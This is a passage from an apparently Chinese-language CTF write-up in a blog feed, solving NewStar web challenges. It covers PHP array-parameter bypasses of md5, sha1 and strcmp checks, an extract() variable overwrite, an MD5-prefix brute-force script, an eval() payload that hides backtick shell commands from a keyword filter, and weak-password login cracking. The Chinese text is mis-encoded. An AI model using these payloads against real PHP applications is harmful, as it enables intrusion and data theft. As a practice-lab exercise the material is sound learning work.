PHP"></a>Begin of PHP</h2><p>ç½‘é¡µä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>ç»•è¿‡ç¬¬ä¸€ä¸ªifï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-comment">//è·å–key1å’Œkey2çš„å€¼ï¼Œä»–ä»¬çš„å€¼ä¸èƒ½ç›¸åŒï¼Œä½†æ˜¯md5çš„å€¼ç›¸åŒï¼Œå¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡æ³•</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//ä¼šå¼ºåˆ¶ç»“æŸphpè¿›ç¨‹ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?key1[]=1&amp;key2[]=2<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927132411728.png" alt="image-20230927132411728"></p><p>ç»•è¿‡ç¬¬äºŒä¸ªif:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//è¾“å…¥çš„key3çš„å€¼ï¼Œè¦ä½¿å®ƒçš„md5å€¼å’Œsha1çš„å€¼ç›¸åŒ</span><br>        <span class="hljs-comment">//md5åŠ å¯†å’Œsha1åŠ å¯†å¯¹æ•°ç»„çš„è¿”å›ç»“æœéƒ½æ˜¯null</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927132609158.png" alt="image-20230927132609158"></p><p>ç»•è¿‡ç¬¬ä¸‰ä¸ªifï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//key4è¾“å…¥çš„å€¼çš„å†…å®¹å’Œ/flagä¸­çš„å†…å®¹è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒåˆ™è¿”å›0</span><br>        <span class="hljs-comment">//strcmp()å¦‚æœæ¯”è¾ƒçš„å†…å®¹æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œåˆ™ä¼šç›´æ¥è¿”å›0</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927133350093.png" alt="image-20230927133350093"></p><p>ç»•è¿‡ç¬¬å››ä¸ªif:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//æˆ‘ä»¬éœ€è¦è¾“å…¥ä¸€ä¸ªkey5çš„å€¼ï¼Œå®ƒçš„ç±»å‹ä¸èƒ½æ˜¯æ•°å­—ï¼Œä½†æ˜¯å®ƒçš„å€¼è¦å¤§äº2023</span><br>        <span class="hljs-comment">//ä½¿ç”¨key5=&quot;9e9&quot;,æ²¡æœ‰ç»•è¿‡å»</span><br>        <span class="hljs-comment">//ä½¿ç”¨key5[]=&quot;9e9&quot;,å‘ç°ç»•è¿‡ï¼Œåˆ¤æ–­ä¸ºæ•°ç»„ç±»å‹å,ç”±äºkey5ç°åœ¨ä»£è¡¨çš„æ˜¯æ•°ç»„ï¼Œæ‰€ä»¥å‚ä¸æ¯”è¾ƒçš„æ˜¯key5çš„åœ°å€å€¼ï¼Œåœ°å€å€¼ä¸€èˆ¬éƒ½å¾ˆå¤§</span><br>        <span class="hljs-comment">//ç±»å‹åˆ¤æ–­æ—¶ä¸ºæ•°ç»„</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;9e9&quot;<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927134811015.png" alt="image-20230927134811015"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;1&quot;<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927134955048.png" alt="image-20230927134955048"></p><p>ç»•è¿‡æœ€åä¸€ä¸ªif:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-comment">//extract()å¯ä»¥é€šè¿‡ä¼ å…¥çš„åŒåå˜é‡å€¼ï¼Œå¯¹å·²æœ‰å­—ç¬¦é›†è¿›è¡Œå˜é‡å€¼è¦†ç›–</span><br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<span class="hljs-comment">//$_POSTè·å–postä¼ å…¥çš„æ‰€æœ‰å‚æ•°å€¼ï¼Œå¹¶å½¢æˆå…³è”æ•°ç»„</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-comment">//æ¯”è¾ƒpostä¼ å‚ä¸­çš„æ‰€æœ‰å‚æ•°çš„å€¼æ˜¯å¦å­˜åœ¨å­—æ¯å’Œæ•°å­—</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-comment">//æ‰€ä»¥æˆ‘ä»¬postä¼ å‚ä¸­çš„æ‰€æœ‰å˜é‡çš„å€¼éƒ½ä¸èƒ½æœ‰æ•°å­—å’Œå­—æ¯</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//è¿™é‡Œå­˜åœ¨$flag5å˜é‡ï¼Œè¯´æ˜å­—ç¬¦é›†ä¸­å­˜åœ¨$flag5å˜é‡å€¼ï¼Œå¯ä»¥é€šè¿‡extract()å‡½æ•°å¯¹å…¶è¿›è¡Œå˜é‡è¦†ç›–</span><br>    <span class="hljs-comment">//å¼±ifåˆ¤æ–­ï¼Œåªè¦$flag5ä¸æ˜¯0æˆ–ç©ºæˆ–null,å®ƒå°±ä¼šåˆ¤æ–­ä¸ºtrue,æ‰€ä»¥åªéœ€è¦ä¼ å…¥ä¸€ä¸ªéå­—æ¯éæ•°å­—çš„å­—ç¬¦å³å¯</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-comment">//è¾“å‡ºæ ¹ç›®å½•flagæ–‡ä»¶çš„å†…å®¹</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;9e9&quot;<br>POST:<br>key3[]=@&amp;flag5=@<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927135825599.png" alt="image-20230927135825599"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-comment">//æˆ‘ä»¬è¾“å…¥çš„å€¼çš„md5åŠ å¯†åçš„ç»“æœçš„å‰6ä¸ªå­—ç¬¦éœ€è¦æ˜¯c4d038</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-comment">//å¯¹æˆ‘ä»¬è¾“å…¥çš„e_v.a.lå‚æ•°è¿›è¡Œè¿‡æ»¤</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è„šæœ¬çˆ†ç ´md5:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> (i &lt;= <span class="hljs-number">10000000</span>):<br>    md5 = hashlib.md5()<br>    s = <span class="hljs-built_in">str</span>(i)<br>    md5.update(s.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    result = md5.hexdigest()<br>    <span class="hljs-keyword">if</span> result[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&quot;c4d038&quot;</span>:<br>        <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-built_in">print</span>(s)<br>    i = i+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">c4d038b4bed09fdb1471ef51ec3a32cd<br>114514<br></code></pre></td></tr></table></figure><p>phpéæ³•ä¼ å‚ä»‹ç»ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¸­å­˜åœ¨_åˆ™ä¼šè¢«phpæ›¿æ¢æˆ[,ä½†æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¸­æ˜¯[åˆ™ä¼šè¢«æ›¿æ¢æˆ_<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">password=114514&amp;e[v.a.l=echo `l\s /`;//ä½¿ç”¨è½¬ä¹‰å­—ç¬¦æ³•ç»•è¿‡è¿‡æ»¤<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927141744793.png" alt="image-20230927141744793"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">password=114514&amp;e[v.a.l=echo `tac /fl\ag`;//åœ¨å‘½ä»¤æ‰§è¡Œæ—¶\ä¼šè¢«è‡ªåŠ¨å»é™¤<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927141826484.png" alt="image-20230927141826484"></p><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p><img src="/images/2023-10-4-Newstar-1/image-20231001174106677.png" alt="image-20231001174106677"></p><p>å‘ç°ç”¨æˆ·ç™»å½•ç•Œé¢ï¼Œæˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªè´¦æˆ·,ä¸€èˆ¬å…ˆæ³¨å†Œä¸€ä¸‹admin,çœ‹ä¸€ä¸‹è¿™ä¸ªç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨adminè´¦æˆ·:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174230138.png" alt="image-20231001174230138"></p><p>å‘ç°å·²ç»å­˜åœ¨adminè´¦æˆ·ï¼ŒçŒœæµ‹ç½‘ç«™å¯ä»¥ä½¿ç”¨å¼±å¯†ç æœ¬çˆ†ç ´ï¼Œé€šè¿‡æŠ“åŒ…ï¼Œæˆ‘ä»¬å‘ç°passwordçš„ä¼ è¾“æ˜¯é€šè¿‡md5çš„å½¢å¼ä¼ è¾“ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦md5å¼±å¯†ç æœ¬è¿›è¡Œçˆ†ç ´:</p><p><img src="/images/2023-10-4-Newstar-1/image-20231001204748276.png" alt="image-20231001204748276"></p><p><img src="/images/2023-10-4-Newstar-1/image-20231001204814702.png" alt="image-20231001204814702"></p><p>æœ€ç»ˆæˆ‘ä»¬é€šè¿‡åœ¨md5å¯†ç æœ¬ä¸­æŸ¥æ‰¾ï¼Œå‘ç°adminçš„å¯†ç æ˜¯000000</p><p>ä½¿ç”¨bpæŠ“å–ç™»å½•ä¿¡æ¯:</p><p><img src="/images/2023-10-4-Newstar-1/image-20231001174542432.png" alt="image-20231001174542432"></p><p>ç‚¹å‡»å‘é€ï¼ŒæŠ“å–ç¬¬äºŒä¸ªä¼ è¾“çš„åŒ…:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174616160.png" alt="image-20231001174616160"></p><p>å°†ç¬¬äºŒä¸ªåŒ…å‘é€åˆ°é‡å‘å™¨ä¸­,ç„¶åç‚¹å‡»å‘é€ï¼Œè·å–å“åº”ä¿¡æ¯:<br><img src="/images/2023-10-4-Newstar-1/image-20231001174814623.png" alt="image-20231001174814623"></p><p>æœ€ç»ˆæˆ‘ä»¬åœ¨302å“åº”ç•Œé¢ä¸­å‘ç°è¢«æ³¨é‡Šçš„flagä¿¡æ¯</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CNSS [Easy] ezhttpé¢˜è§£</title>
    <link href="/2023/09/25/2023-09-25-CNSS_ezhttp/"/>
    <url>/2023/09/25/2023-09-25-CNSS_ezhttp/</url>
    
